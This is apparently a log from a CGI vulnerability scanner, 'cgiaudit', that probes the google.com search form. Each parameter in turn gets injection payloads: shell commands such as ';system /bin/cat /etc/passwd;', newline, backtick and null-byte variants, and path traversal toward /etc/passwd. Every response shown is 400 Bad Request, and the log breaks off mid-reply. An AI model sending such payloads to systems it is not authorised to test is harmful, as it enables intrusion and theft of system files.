
cgiaudit by S
~^~^~^~^~^~^~

usage: ./cgiaudit [-hrvx] [-s bits] [-p proxyhost -t proxy port] [-c file] URL [URL2] [...]
-h          help
-c file     config file
-p hostname proxy host
-r          print headers
-s [#|/#]   spider
-t port     proxy port
-v          verbose
-x          hex urlencode

[1.0] Server redirect: http://www.google.com/

cgiaudit by S
~^~^~^~^~^~^~

[1.0] Parsing document https://google.com .. 
[1.0] --+-- BEGIN HTTP REQUEST --+--
GET / HTTP/1.0
Host: google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.0] --+--  END HTTP REQUEST  --+--
[1.0] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 301 Moved Permanently
Location: http://www.google.com/
[1.0]  --+--   END HTTP REPLY   --+--
[1.0] --+-- BEGIN HTTP REQUEST --+--
GET / HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.0] --+--  END HTTP REQUEST  --+--
[1.0] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 200 OK
Date: Mon, 16 Apr 2018 14:32:47 GMT
Expires: -1
Cache-Control: private, max-age=0
Content-Type: text/html; charset=ISO-8859-1
P3P: CP="This is not a P3P policy! See g.co/p3phelp for more info."
Server: gws
X-XSS-Protection: 1; mode=block
X-Frame-Options: SAMEORIGIN
Set-Cookie: 1P_JAR=2018-04-16-14; expires=Wed, 16-May-2018 14:32:47 GMT; path=/; domain=.google.com
Set-Cookie: NID=128=ImcGS5g8D9dCtBbc[1.0] WARNING: No Content-Length received from server, implying 65536 (the entire document may not be parsed)!
1N1mjZitUNiZJt_x_mAy6vVMjjxUy1RuWRn1L1TWfxSlii_sr7UW11KzhFb5LxHg0W66osVFpX4u35JUdF4uE46yOniJc6GCrSlQK8TuVFPNY0r4; expires=Tue, 16-Oct-2018 14:32:47 GMT; path=/; domain=.google.com; HttpOnly
Accept-Ranges: none
Vary: Accept-Encoding
[1.0] --+--   END HTTP REPLY   --+--
[1.0] Done parsing HTML; commencing audit routine.
[1.1] Now auditing form 1 f
[1.1] Testing for vulnerabilities..
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=;system%20/bin/cat%20/etc/passwd;&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=;system%20/bin/cat%20/etc/passwd;&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=;system%20/bin/cat%20/etc/passwd;&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=;system%20/bin/cat%20/etc/passwd;&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=;system%20/bin/cat%20/etc/passwd;&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=;system%20/bin/cat%20/etc/passwd;&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=;system%20/bin/cat%20/etc/passwd; HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=%0a/bin/cat%20/etc/passwd&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=%0a/bin/cat%20/etc/passwd&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=%0a/bin/cat%20/etc/passwd&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=%0a/bin/cat%20/etc/passwd&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=%0a/bin/cat%20/etc/passwd&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=%0a/bin/cat%20/etc/passwd&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=%0a/bin/cat%20/etc/passwd HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=/bin/cat%20/etc/passwd%00&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=/bin/cat%20/etc/passwd%00&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=/bin/cat%20/etc/passwd%00&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:47 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=/bin/cat%20/etc/passwd%00&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=/bin/cat%20/etc/passwd%00&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=/bin/cat%20/etc/passwd%00&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=/bin/cat%20/etc/passwd%00 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=\\`/bin/cat%20/etc/passwd\\`&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=\\`/bin/cat%20/etc/passwd\\`&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=\\`/bin/cat%20/etc/passwd\\`&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=\\`/bin/cat%20/etc/passwd\\`&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=\\`/bin/cat%20/etc/passwd\\`&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=\\`/bin/cat%20/etc/passwd\\`&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=\\`/bin/cat%20/etc/passwd\\` HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=/../../../../../../../../../../../../etc/passwd&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=/../../../../../../../../../../../../etc/passwd&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=/../../../../../../../../../../../../etc/passwd&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=/../../../../../../../../../../../../etc/passwd&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=/../../../../../../../../../../../../etc/passwd&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=/../../../../../../../../../../../../etc/passwd&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=/../../../../../../../../../../../../etc/passwd HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=/../../../../../../../../../../../../etc/passwd%00&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=/../../../../../../../../../../../../etc/passwd%00&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=/../../../../../../../../../../../../etc/passwd%00&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:48 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=/../../../../../../../../../../../../etc/passwd%00&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=/../../../../../../../../../../../../etc/passwd%00&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=/../../../../../../../../../../../../etc/passwd%00&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=ISO-8859-1&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=/../../../../../../../../../../../../etc/passwd%00 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
[1.1] --+--   END HTTP REPLY   --+--
[1.1] --+-- BEGIN HTTP REQUEST --+--
GET /search?ie=cat%20/etc/passwd&hl=en&source=hp&q=&btnG=Google Search&btnI=I'm Feeling Lucky&gbv=1 HTTP/1.0
Host: www.google.com
User-Agent: Mozilla/4.61 [en] (X11; I; Linux 2.2.12-20 i586)
[1.1] --+--  END HTTP REQUEST  --+--
[1.1] --+--  BEGIN HTTP REPLY  --+--
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8
Referrer-Policy: no-referrer
Content-Length: 1555
Date: Mon, 16 Apr 2018 14:32:49 GMT
